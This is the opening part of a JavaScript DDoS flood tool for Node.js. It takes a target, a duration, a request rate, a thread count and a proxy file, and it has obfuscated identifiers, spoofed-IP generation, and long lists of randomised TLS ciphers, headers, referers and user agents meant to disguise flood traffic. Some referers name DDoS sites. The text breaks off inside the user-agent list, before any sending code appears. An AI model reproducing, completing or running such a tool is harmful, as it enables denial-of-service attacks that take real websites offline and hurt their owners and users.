const net = require('net');
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require('url');
const fs = require('fs');
process.setMaxListeners(0x0);
require("events").EventEmitter.defaultMaxListeners = 0x0;
process.on("uncaughtException", function (_0x36e89c) {});
if (process.argv.length < 0x7) {
  console.log("Usage: node target time rate thread proxyfile");
  process.exit();
}
const headers = {};
function readLines(_0x46e57b) {
  return fs.readFileSync(_0x46e57b, "utf-8").toString().split(/\r?\n/);
}
function randomIntn(_0x862bfc, _0x2be24d) {
  return Math.floor(Math.random() * (_0x2be24d - _0x862bfc) + _0x862bfc);
}
function randomElement(_0x4705e0) {
  return _0x4705e0[Math.floor(Math.random() * (_0x4705e0.length - 0x0) + 0x0)];
}
function randstr(_0x4c0fff) {
  let _0x40b83e = '';
  const _0x4f93f9 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".length;
  for (let _0x550974 = 0x0; _0x550974 < _0x4c0fff; _0x550974++) {
    _0x40b83e += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789".charAt(Math.floor(Math.random() * _0x4f93f9));
  }
  return _0x40b83e;
}
const ip_spoof = () => {
  return Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff);
};
const spoofed = Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff) + '.' + Math.floor(Math.random() * 0xff);
const args = {
  'target': process.argv[0x2],
  'time': parseInt(process.argv[0x3]),
  'Rate': parseInt(process.argv[0x4]),
  'threads': parseInt(process.argv[0x5]),
  'proxyFile': process.argv[0x6]
};
const sig = ["ecdsa_secp256r1_sha256", "ecdsa_secp384r1_sha384", "ecdsa_secp521r1_sha512", "rsa_pss_rsae_sha256", "rsa_pss_rsae_sha384", 'rsa_pss_rsae_sha512', 'rsa_pkcs1_sha256', "rsa_pkcs1_sha384", "rsa_pkcs1_sha512"];
const cplist = ["ECDHE-ECDSA-AES128-GCM-SHA256", "ECDHE-ECDSA-CHACHA20-POLY1305", "ECDHE-RSA-AES128-GCM-SHA256", "ECDHE-RSA-CHACHA20-POLY1305", "ECDHE-ECDSA-AES256-GCM-SHA384", 'ECDHE-RSA-AES256-GCM-SHA384'];
const accept_header = ["*/*", "image/*", "image/webp,image/apng", "text/html", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8', "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3"];
lang_header = ['ko-KR', 'en-US', "zh-CN", "zh-TW", "ja-JP", "en-GB", "en-AU", "en-GB,en-US;q=0.9,en;q=0.8", 'en-GB,en;q=0.5', "en-CA", "en-UK, en, de;q=0.5", "en-NZ", "en-GB,en;q=0.6", "en-ZA", "en-IN", "en-PH", "en-SG", "en-HK", "en-GB,en;q=0.8", "en-GB,en;q=0.9", " en-GB,en;q=0.7"];
const encoding_header = ["gzip, deflate, br", "deflate", "gzip, deflate, lzma, sdch", "deflate"];
const control_header = ['no-cache', 'max-age=0'];
const refers = ["http://anonymouse.org/cgi-bin/anon-www.cgi/", 'http://careers.gatesfoundation.org/search?q=', 'http://coccoc.com/search#query=', "http://ddosvn.somee.com/f5.php?v=", 'http://engadget.search.aol.com/search?q=', 'http://engadget.search.aol.com/search?q=query?=query=&q=', "http://eu.battle.net/wow/en/search?q=", 'http://filehippo.com/search?q=', "http://funnymama.com/search?q=", "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=", "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/", "http://go.mail.ru/search?mail.ru=1&q=", "http://help.baidu.com/searchResult?keywords=", "http://host-tracker.com/check_page/?furl=", 'http://itch.io/search?q=', "http://jigsaw.w3.org/css-validator/validator?uri=", "http://jobs.bloomberg.com/search?q=", "http://jobs.leidos.com/search?q=", 'http://jobs.rbs.com/jobs/search?q=', "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=", "http://louis-ddosvn.rhcloud.com/f5.html?v=", "http://millercenter.org/search?q=", "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=", "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/", 'http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=', "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/", "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=", "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=", "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=", 'http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/', "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q=", 'http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf/', "http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%&q=", 'http://ru.wikipedia.org/wiki/%D0%9C%D1%8D%D1%x80_%D0%/', 'http://search.aol.com/aol/search?q=', "http://taginfo.openstreetmap.org/search?q=", "http://techtv.mit.edu/search?q=", "http://validator.w3.org/feed/check.cgi?url=", "http://vk.com/profile.php?redirect=", 'http://www.ask.com/web?q=', "http://www.baoxaydung.com.vn/news/vn/search&q=", 'http://www.bestbuytheater.com/events/search?q=', 'http://www.bing.com/search?q=', 'http://www.evidence.nhs.uk/search?q=', 'http://www.google.com/?q=', "http://www.google.com/translate?u=", "http://www.google.ru/url?sa=t&rct=?j&q=&e&q=", "http://www.google.ru/url?sa=t&rct=?j&q=&e/", "http://www.online-translator.com/url/translation.aspx?direction=er&sourceURL=", "http://www.pagescoring.com/website-speed-test/?url=", "http://www.reddit.com/search?q=", "http://www.search.com/search?q=", "http://www.shodanhq.com/search?q=", 'http://www.tceq.texas.gov/@@tceq-search?q=', 'http://www.ted.com/search?q=', "http://www.topsiteminecraft.com/site/pinterest.com/search?q=", "http://www.usatoday.com/search/results?q=", "http://www.ustream.tv/search?q=", "http://yandex.ru/yandsearch?text=", "http://yandex.ru/yandsearch?text=%D1%%D2%?=g.sql()81%&q=", "http://ytmnd.com/search?q=", "https://add.my.yahoo.com/rss?url=", 'https://careers.carolinashealthcare.org/search?q=', "https://check-host.net/", "https://developers.google.com/speed/pagespeed/insights/?url=", "https://drive.google.com/viewerng/viewer?url=", "https://duckduckgo.com/?q=", 'https://google.com/', "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=&q=", "https://google.com/#hl=en-US?&newwindow=1&safe=off&sclient=psy=?-ab&query=%D0%BA%D0%B0%Dq=?0%BA+%D1%83%()_D0%B1%D0%B=8%D1%82%D1%8C+%D1%81bvc?&=query&%D0%BB%D0%BE%D0%BD%D0%B0q+=%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+%D1%87%D0%BB%D0%B5%D0%BD&oq=q=%D0%BA%D0%B0%D0%BA+%D1%83%D0%B1%D0%B8%D1%82%D1%8C+%D1%81%D0%BB%D0%BE%D0%BD%D0%B0+%D1%80%D1%83%D0%B6%D1%8C%D0%B5+%D0%BA%D0%B0%D0%BA%D0%B0%D1%88%D0%BA%D0%B0+%D0%BC%D0%BE%D0%BA%D1%DO%D2%D0%B0%D1%81%D0%B8%D0%BD%D1%8B+?%D1%87%D0%BB%D0%B5%D0%BD&gs_l=hp.3...192787.206313.12.206542.48.46.2.0.0.0.190.7355.0j43.45.0.clfh..0.0.ytz2PqzhMAc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=?882&q=", "https://help.baidu.com/searchResult?keywords=", 'https://play.google.com/store/search?q=', "https://pornhub.com/", "https://r.search.yahoo.com/", "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=", 'https://steamcommunity.com/market/search?q=', "https://vk.com/profile.php?redirect=", "https://www.bing.com/search?q=", "https://www.cia.gov/index.html", "https://www.facebook.com/", "https://www.facebook.com/l.php?u=https://www.facebook.com/l.php?u=", "https://www.facebook.com/sharer/sharer.php?u=https://www.facebook.com/sharer/sharer.php?u=", "https://www.fbi.com/", 'https://www.google.ad/search?q=', "https://www.google.ae/search?q=", 'https://www.google.al/search?q=', "https://www.google.am/search?q=", "https://www.google.co.ao/search?q=", "https://www.google.com.af/search?q=", "https://www.google.com.ag/search?q=", 'https://www.google.com.ai/search?q=', "https://www.google.com/search?q=", "https://www.google.ru/#hl=ru&newwindow=1&safe..,iny+gay+q=pcsny+=;zdr+query?=poxy+pony&gs_l=hp.3.r?=.0i19.505.10687.0.10963.33.29.4.0.0.0.242.4512.0j26j3.29.0.clfh..0.0.dLyKYyh2BUc&pbx=1&bav=on.2,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp?=?fd2cf4e896a87c19&biw=1389&bih=832&q=", "https://www.google.ru/#hl=ru&newwindow=1&safe..,or.r_gc.r_pw.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=925&q=", "https://www.google.ru/#hl=ru&newwindow=1?&saf..,or.r_gc.r_pw=?.r_cp.r_qf.,cf.osb&fp=fd2cf4e896a87c19&biw=1680&bih=882&q=", "https://www.npmjs.com/search?q=", 'https://www.om.nl/vaste-onderdelen/zoeken/?zoeken_term=', 'https://www.pinterest.com/search/?q=', "https://www.qwant.com/search?q=", "https://www.ted.com/search?q=", "https://www.usatoday.com/search/results?q=", "https://www.yandex.com/yandsearch?text=", 'https://www.youtube.com/', 'https://yandex.ru/'];
const uap = ["Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; AS; rv:11.0) like Gecko", "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0;  rv:11.0) like Gecko", "Mozilla/5.0 (compatible; MSIE 10.6; Windows NT 6.1; Trident/5.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727) 3gpp-gba UNTRUSTED/1.0", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 7.0; InfoPath.3; .NET CLR 3.1.40767; Trident/6.0; en-IN)", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/6.0)", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)", "Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/4.0; InfoPath.2; SV1; .NET CLR 2.0.50727; WOW64)", "Mozilla/5.0 (compatible; MSIE 10.0; Macintosh; Intel Mac OS X 10_7_3; Trident/6.0)", "Mozilla/4.0 (Compatible; MSIE 8.0; Windows NT 5.2; Trident/6.0)", "Mozilla/4.0 (compatible; MSIE 10.0; Windows NT 6.1; Trident/5.0)", "Mozilla/1.22 (compatible; MSIE 10.0; Windows 3.1)", "Mozilla/5.0 (Windows; U; MSIE 9.0; WIndows NT 9.0; en-US))", "Mozilla/5.0 (Windows; U; MSIE 9.0; Windows NT 9.0; en-US)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 7.1; Trident/5.0)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; Media Center PC 6.0; InfoPath.3; MS-RTC LM 8; Zune 4.7", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; InfoPath.3; MS-RTC LM 8; .NET4.0C; .NET4.0E)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; chromeframe/12.0.742.112)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 2.0.50727; Media Center PC 6.0)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 4.0; Tablet PC 2.0; InfoPath.3; .NET4.0C; .NET4.0E)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; yie8)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.2; .NET CLR 1.1.4322; .NET4.0C; Tablet PC 2.0)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/13.0.782.215)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; chromeframe/11.0.696.57)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0) chromeframe/10.0.648.205", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.1; SV1; .NET CLR 2.8.52393; WOW64; en-US)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)", "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/4.0; GTB7.4; InfoPath.3; SV1; .NET CLR 3.1.76908; WOW64; en-US)", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB7.4; InfoPath.2; SV1; .NET CLR 3.3.69573; WOW64; en-US)", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.8.36217; WOW64; en-US)", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.0; Trident/4.0; .NET CLR 2.7.58687; SLCC2; Media Center PC 5.0; Zune 3.4; Tablet PC 3.6; InfoPath.3)", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.2; Trident/4.0; Media Center PC 4.0; SLCC1; .NET CLR 3.0.04320)", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 1.1.4322)", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; InfoPath.2; SLCC1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 2.0.50727)", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; Trident/4.0; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.1; SLCC1; .NET CLR 1.1.4322)", "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 5.0; Trident/4.0; InfoPath.1; SV1; .NET CLR 3.0.4506.2152; .NET CLR 3.5.30729; .NET CLR 3.0.04506.30)", "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.0; Trident/4.0; FBSMTWB; .NET CLR 2.0.34861; .NET CLR 3.0.3746.3218; .NET CLR 3.5.33652; msn OptimizedIE8;ENUS)", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.2; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0)", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8)", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; Media Center PC 6.0; InfoPath.2; MS-RTC LM 8", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C)", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; InfoPath.2)", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; Zune 3.0)", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; msn OptimizedIE8;ZHCN)", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; InfoPath.3; .NET4.0C; .NET4.0E) chromeframe/8.0.552.224", "More Internet Explorer 8.0 user agents strings -->>", "Mozilla/4.0(compatible; MSIE 7.0b; Windows NT 6.0)", "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 6.0)", "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.2; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 3.0.04506.30)", "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; Media Center PC 3.0; .NET CLR 1.0.3705; .NET CLR 1.1.4322; .NET CLR 2.0.50727; InfoPath.1)", "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; FDM; .NET CLR 1.1.4322)", "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1; .NET CLR 2.0.50727)", "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; InfoPath.1)", "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar; .NET CLR 2.0.50727)", "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; Alexa Toolbar)", "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.40607)", "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.1.4322)", "Mozilla/4.0 (compatible; MSIE 7.0b; Windows NT 5.1; .NET CLR 1.0.3705; Media Center PC 3.1; Alexa Toolbar; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; en-US)", "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 6.0; el-GR)", "Mozilla/5.0 (Windows; U; MSIE 7.0; Windows NT 5.2)", "Mozilla/5.0 (MSIE 7.0; Macintosh; U; SunOS; X11; gu; SV1; InfoPath.2; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)", "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; WOW64; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)", "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0; c .NET CLR 3.0.04506; .NET CLR 3.5.30707; InfoPath.1; el-GR)", "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; fr-FR)", "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 6.0; en-US)", "Mozilla/5.0 (compatible; MSIE 7.0; Windows NT 5.2; WOW64; .NET CLR 2.0.50727)", "Mozilla/5.0 (compatible; MSIE 7.0; Windows 98; SpamBlockerUtility 6.3.91; SpamBlockerUtility 6.2.91; .NET CLR 4.1.89;GB)", "Mozilla/4.79 [en] (compatible; MSIE 7.0; Windows NT 5.0; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30; .NET CLR 3.0.04506.648)", "Mozilla/4.0 (Windows; MSIE 7.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)", "Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1; .NET CLR 3.0.04506.30)", "Mozilla/4.0 (Mozilla/4.0; MSIE 7.0; Windows NT 5.1; FDM; SV1)", "Mozilla/4.0 (compatible;MSIE 7.0;Windows NT 6.0)", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.2; Win64; x64; Trident/6.0; .NET4.0E; .NET4.0C)", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; InfoPath.3; .NET4.0C; .NET4.0E; .NET CLR 3.5.30729; .NET CLR 3.0.30729; MS-RTC LM 8)", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; WOW64; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; MS-RTC LM 8; .NET4.0C; .NET4.0E; InfoPath.3)", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; Trident/6.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET4.0C; .NET4.0E)", "Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.1; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; chromeframe/12.0.742.100)", "More Internet Explorer 7.0 user agents strings -->>", "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", "Mozilla/4.0 (compatible; MSIE 6.1; Windows XP)", "Mozilla/4.0 (compatible; MSIE 6.01; Windows NT 6.0)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1; DigExt)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.2.6)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.0.0) (Compatible;  ;  ; Trident/4.0)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; YComp 5.0.0.0)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.1.4322)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0; .NET CLR 1.0.2914)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; YComp 5.0.0.0)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98; Win 9x 4.90)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows 98)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.1)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 5.0; .NET CLR 1.0.3705)", "Mozilla/4.0 (compatible; MSIE 6.0b; Windows NT 4.0)", "Mozilla/5.0 (Windows; U; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)", "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 2.0.50727)", "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4325)", "Mozilla/5.0 (compatible; MSIE 6.0; Windows NT 5.1)", "Mozilla/45.0 (compatible; MSIE 6.0; Windows NT 5.1)", "Mozilla/4.08 (compatible; MSIE 6.0; Windows NT 5.1)", "Mozilla/4.01 (compatible; MSIE 6.0; Windows NT 5.1)", "Mozilla/4.0 (X11; MSIE 6.0; i686; .NET CLR 1.1.4322; .NET CLR 2.0.50727; FDM)", "Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 6.0)", "Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.2)", "Mozilla/4.0 (Windows; MSIE 6.0; Windows NT 5.0)", "Mozilla/4.0 (Windows;  MSIE 6.0;  Windows NT 5.1;  SV1; .NET CLR 2.0.50727)", "Mozilla/4.0 (MSIE 6.0; Windows NT 5.1)", "Mozilla/4.0 (MSIE 6.0; Windows NT 5.0)", "Mozilla/4.0 (compatible;MSIE 6.0;Windows 98;Q312461)", "Mozilla/4.0 (Compatible; Windows NT 5.1; MSIE 6.0) (compatible; MSIE 6.0; Windows NT 5.1; .NET CLR 1.1.4322; .NET CLR 2.0.50727)", "Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1) (Compatible;  ;  ; Trident/4.0; WOW64; Trident/4.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; .NET CLR 1.0.3705; .NET CLR 1.1.4322)", "Mozilla/4.0 (compatible; U; MSIE 6.0; Windows NT 5.1)", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; InfoPath.3; Tablet PC 2.0)", "Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; Trident/4.0; GTB6.5; QQDownload 534; Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1) ; SLCC2; .NET CLR 2.0.50727; Media Center PC 6.0; .NET CLR 3.5.30729; .NET CLR 3.0.30729)", "Mozilla/4.0 (compatible; MSIE 5.5b1; Mac_PowerPC)", "Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.9; SiteCoach 1.0)", "Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8; SiteCoach 1.0)", "Mozilla/4.0 (compatible; MSIE 5.50; Windows NT; SiteKiosk 4.8)", "Mozilla/4.0 (compatible; MSIE 5.50; Windows 98; SiteKiosk 4.8)", "Mozilla/4.0 (compatible; MSIE 5.50; Windows 95; SiteKiosk 4.8)", "Mozilla/4.0 (compatible;MSIE 5.5; Windows 98)", "Mozilla/4.0 (compatible; MSIE 